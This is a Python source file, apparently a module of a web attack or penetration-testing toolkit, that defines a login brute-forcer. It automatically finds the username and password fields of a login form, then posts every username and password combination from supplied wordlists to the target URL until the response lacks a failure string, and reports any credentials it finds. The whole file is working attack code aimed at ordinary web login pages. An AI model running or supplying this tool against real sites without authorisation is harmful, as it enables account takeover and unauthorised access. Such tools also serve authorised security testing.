from utils.http_client import HttpClient
from utils.reporter import Reporter
from utils.form_parser import get_forms


class LoginBruteforcer:

    def __init__(self, http_client: HttpClient, reporter: Reporter, config: dict):
        self.client = http_client
        self.reporter = reporter
        self.url = config['url']
        self.user_param = config.get('user_param')
        self.pass_param = config.get('pass_param')
        self.failure_string = config['failure_string']
        #Keywords to identify a username field
        self.username_keywords = ['user', 'login', 'email', 'uname', 'username', 'log']

    def _find_login_form_fields(self):
        """
        Automatically finds the login and password field names in a form.
        Returns a tuple (user_field_name, pass_field_name) or (None, None) on failure.
        """
        print("[*] Attempting to auto-discover form parameters...")
        forms = get_forms(self.client, self.url)
        for form in forms:
            pass_field = None
            user_field = None

            #Finding the password field
            for field in form['inputs']:
                if field.get('type') == 'password':
                    pass_field = field.get('name')
                    break

            if pass_field:
                for field in form['inputs']:
                    field_name = field.get('name')
                    if field.get('type') in ['text', 'email', 'tel'] or not field.get('type'):
                        for keyword in self.username_keywords:
                            if keyword in field_name.lower():
                                user_field = field_name
                                print(
                                    f"[*] Auto-discovery successful! Found user param: '{user_field}', pass param: '{pass_field}'")
                                return (user_field, pass_field)

        print("Auto-discovery failed. Please provide parameters manually using --user-param and --pass-param.")
        return (None, None)

    def _try_login(self, username, password):
        """Attempts a single login with a given username and password."""
        payload = {self.user_param: username, self.pass_param: password}
        try:
            response = self.client.session.post(self.url, data=payload)
            if self.failure_string.lower() not in response.text.lower():
                return True
        except Exception as e:
            print(f"[!] An error occurred during login attempt: {e}")
        return False

    def run_attack(self, user_list_path, pass_list_path):
        """Runs the brute-force attack using the provided wordlists."""
        print("[*] Starting login brute-force attack...")

        if not self.user_param or not self.pass_param:
            self.user_param, self.pass_param = self._find_login_form_fields()

        if not self.user_param or not self.pass_param:
            return None

        try:
            with open(user_list_path, 'r') as f:
                usernames = [line.strip() for line in f]
            with open(pass_list_path, 'r') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError as e:
            print(f"ERROR: Could not find wordlist file: {e}")
            return None

        print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
        print(f"[*] Total attempts to make: {len(usernames) * len(passwords)}")

        for username in usernames:
            for password in passwords:
                print(f"[*] Trying: {username}:{password}", end='\r')
                if self._try_login(username, password):
                    success_message = f"\n✅ SUCCESS! Credentials found: {username}:{password}"
                    print(success_message)
                    self.reporter.log_raw('login_bruteforcer', {"found_credentials": success_message})
                    return (username, password)

        print("\n[-] Brute-force attack finished. No credentials found.")
        return None